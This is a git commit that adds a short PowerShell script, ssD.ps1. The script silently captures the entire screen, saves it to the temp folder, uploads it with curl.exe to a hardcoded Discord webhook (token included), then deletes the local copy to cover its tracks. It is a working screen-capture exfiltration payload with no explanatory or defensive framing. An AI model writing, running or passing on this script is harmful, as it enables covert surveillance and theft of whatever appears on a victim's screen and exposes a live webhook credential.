fb7fa8ca2abffe55dac76280ca91bd67ef1e95b6
KeksCrash <karijuhani42@gmail.com>
2026-07-27 23:44:45 +0200

    Create ssD.ps1

---
+++ ssD.ps1
@@ -0,0 +1,17 @@
+$hookurl = "https://discord.com/api/webhooks/1531411205296488519/BisuIbdqoXZkT4DVeF4U30m6EER9oD5mPZRYwi2pH2Dt7-uToEnKnIjFUj1Gbp89vZ00"
+$Filett = "$env:temp\SC.png"
+Add-Type -AssemblyName System.Windows.Forms
+Add-type -AssemblyName System.Drawing
+$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$Width = $Screen.Width
+$Height = $Screen.Height
+$Left = $Screen.Left
+$Top = $Screen.Top
+$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+Start-Sleep 1
+curl.exe -F "file1=@$filett" $hookurl
+Start-Sleep 1
+Remove-Item -Path $filett
